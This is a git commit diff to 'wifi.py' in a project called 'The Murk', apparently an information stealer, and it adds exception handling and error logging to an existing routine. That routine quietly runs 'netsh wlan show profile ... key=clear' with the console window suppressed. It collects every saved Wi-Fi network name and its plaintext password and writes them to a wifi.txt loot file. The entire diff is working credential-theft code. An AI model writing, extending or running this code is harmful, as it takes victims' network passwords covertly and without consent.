a0cf266329b501b623d9d57f186b296b7d3e65d9
Nguyễn Cao Nguyên <nguyencaonguyen0944322545@gmail.com>
2024-06-13 20:23:52 +0700

    Handled exception for Wifi

--- The Murk/targets/system/wifi.py
+++ The Murk/targets/system/wifi.py
@@ -5,6 +5,7 @@ from subprocess import STARTUPINFO, STARTF_USESHOWWINDOW, run
 from re import findall, search
 from os import environ
 from preferences.config import config
+from manager.logger import Log
 
 def Wifi():
     user = environ['USERPROFILE']
@@ -12,29 +13,32 @@ def Wifi():
     logs = []
     startupinfo = STARTUPINFO()
     startupinfo.dwFlags |= STARTF_USESHOWWINDOW
-    profiles_output = run(['netsh', 'wlan', 'show', 'profiles'], shell=True, capture_output=True, text=True, startupinfo=startupinfo)
-    profile_names = findall(':\s(.+)', profiles_output.stdout)
+    try:
+        profiles_output = run(['netsh', 'wlan', 'show', 'profiles'], shell=True, capture_output=True, text=True, startupinfo=startupinfo)
+        profile_names = findall(':\s(.+)', profiles_output.stdout)
 
-    wifi_passwords = {}
+        wifi_passwords = {}
 
-    for profile in profile_names:
-        password_output = run(['netsh', 'wlan', 'show', 'profile', 'name=' + profile, 'key=clear'], shell=True, text=True, capture_output=True, startupinfo=startupinfo)
-        password = search('Key Content\s+:\s(.+)', password_output.stdout)
+        for profile in profile_names:
+            password_output = run(['netsh', 'wlan', 'show', 'profile', 'name=' + profile, 'key=clear'], shell=True, text=True, capture_output=True, startupinfo=startupinfo)
+            password = search('Key Content\s+:\s(.+)', password_output.stdout)
 
-        if password:
-            wifi_passwords[profile] = password.group(1)
-        else:
-            wifi_passwords[profile] = None
+            if password:
+                wifi_passwords[profile] = password.group(1)
+            else:
+                wifi_passwords[profile] = None
 
-    passwords = wifi_passwords
+        passwords = wifi_passwords
 
-    for profile, password in passwords.items():
-        profile = profile.encode('cp1251', errors='ignore').decode('utf-8', errors='ignore')
-        if password != None:
-            password = password.encode('cp1251', errors='ignore').decode('utf-8', errors='ignore')
+        for profile, password in passwords.items():
+            profile = profile.encode('cp1251', errors='ignore').decode('utf-8', errors='ignore')
+            if password != None:
+                password = password.encode('cp1251', errors='ignore').decode('utf-8', errors='ignore')
 
-        logs.append(f'Wi-Fi Network: {profile}\nPassword: {password}\n')
+            logs.append(f'Wi-Fi Network: {profile}\nPassword: {password}\n')
 
-    with open(pathToLogs+"\\wifi.txt", 'w', encoding='UTF-8') as f:
-        for log in logs:
-            f.write(log+'\n')
+        with open(pathToLogs+"\\wifi.txt", 'w', encoding='UTF-8') as f:
+            for log in logs:
+                f.write(log+'\n')
+    except Exception as e:
+        Log(f"Wifi ---> {e}")
